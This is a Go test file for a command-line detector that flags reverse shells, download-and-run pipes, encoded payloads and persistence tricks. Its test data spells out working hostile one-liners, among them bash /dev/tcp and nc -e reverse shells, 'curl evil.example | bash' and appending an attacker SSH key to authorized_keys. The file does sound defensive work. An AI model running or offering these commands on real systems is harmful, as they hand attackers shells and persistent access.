package collector

import "testing"

// firstRule returns the first finding's rule, or "" if there are none.
func unixRules(cmd string) []string {
	fs := analyzeUnixCommandLine("test", "", cmd)
	var out []string
	for _, f := range fs {
		out = append(out, f.Rule)
	}
	return out
}

func hasRuleName(rules []string, r string) bool {
	for _, x := range rules {
		if x == r {
			return true
		}
	}
	return false
}

func TestUnixCmdlineReverseShells(t *testing.T) {
	malicious := map[string]string{
		"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1":                              "exec.reverse_shell",
		"nc -e /bin/sh 10.0.0.1 4444":                                         "exec.reverse_shell",
		"socat tcp-connect:1.2.3.4:4444 exec:/bin/bash,pty,stderr":            "exec.reverse_shell",
		"python3 -c 'import socket,subprocess,os; pty.spawn(\"/bin/sh\")'":    "exec.reverse_shell",
		"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444": "exec.reverse_shell",
	}
	for cmd, want := range malicious {
		if rules := unixRules(cmd); !hasRuleName(rules, want) {
			t.Errorf("%q: expected %s, got %v", cmd, want, rules)
		}
	}
}

func TestUnixCmdlineFetchAndRun(t *testing.T) {
	for _, cmd := range []string{
		"curl http://evil.example/x.sh | bash",
		"wget -qO- http://evil.example/x|sh",
		"curl -s https://evil.example/i | sudo python3",
	} {
		if rules := unixRules(cmd); !hasRuleName(rules, "exec.download_pipe_shell") {
			t.Errorf("%q: expected exec.download_pipe_shell, got %v", cmd, rules)
		}
	}
	// A plain download to a file is not fetch-and-run.
	if rules := unixRules("curl https://api.example.com/v1/data -o /home/u/data.json"); len(rules) != 0 {
		t.Errorf("plain curl should be quiet, got %v", rules)
	}
}

func TestUnixCmdlineEncodedAndChmod(t *testing.T) {
	if rules := unixRules("echo ZXZpbAo= | base64 -d | bash"); !hasRuleName(rules, "exec.base64_decode") {
		t.Errorf("expected exec.base64_decode, got %v", rules)
	}
	if rules := unixRules("chmod +x /tmp/.hidden/payload && /tmp/.hidden/payload"); !hasRuleName(rules, "exec.chmod_suspicious") {
		t.Errorf("expected exec.chmod_suspicious, got %v", rules)
	}
	// chmod on a normal install path is fine.
	if rules := unixRules("chmod 0755 /usr/local/bin/mytool"); hasRuleName(rules, "exec.chmod_suspicious") {
		t.Errorf("chmod on /usr/local should be quiet, got %v", rules)
	}
}

func TestUnixCmdlinePersistence(t *testing.T) {
	if rules := unixRules("echo 'ssh-ed25519 AAAA... attacker' >> /home/u/.ssh/authorized_keys"); !hasRuleName(rules, "persistence.ssh_authorized_keys") {
		t.Errorf("expected persistence.ssh_authorized_keys, got %v", rules)
	}
	if rules := unixRules("echo 'curl evil|sh' >> ~/.bashrc"); !hasRuleName(rules, "persistence.shell_profile") {
		t.Errorf("expected persistence.shell_profile, got %v", rules)
	}
	if rules := unixRules("(crontab -l; echo '* * * * * /tmp/x') | crontab -"); !hasRuleName(rules, "persistence.cron_install") {
		t.Errorf("expected persistence.cron_install, got %v", rules)
	}
	// crontab -l alone (listing) must not be flagged as install.
	if rules := unixRules("crontab -l"); hasRuleName(rules, "persistence.cron_install") {
		t.Errorf("crontab -l should not be a cron install, got %v", rules)
	}
}

func TestUnixCmdlineQuietOnOrdinary(t *testing.T) {
	ordinary := []string{
		"/usr/sbin/sshd -D",
		"cat /etc/passwd | grep root",
		"python3 /usr/local/lib/app/main.py --port 8080",
		"nginx -g 'daemon off;'",
		"tar -czf /backup/x.tgz /var/data",
	}
	for _, cmd := range ordinary {
		if rules := unixRules(cmd); len(rules) != 0 {
			t.Errorf("ordinary command %q should be quiet, got %v", cmd, rules)
		}
	}
}

func TestContainsWord(t *testing.T) {
	if !containsWord("foo nc bar", "nc") {
		t.Error("should match standalone nc")
	}
	if containsWord("sync now", "nc") {
		t.Error("should not match nc inside sync")
	}
	if containsWord("rsync files", "nc") {
		t.Error("should not match nc inside rsync")
	}
	if !containsWord("a|nc -e", "nc") {
		t.Error("should match nc after a pipe")
	}
}
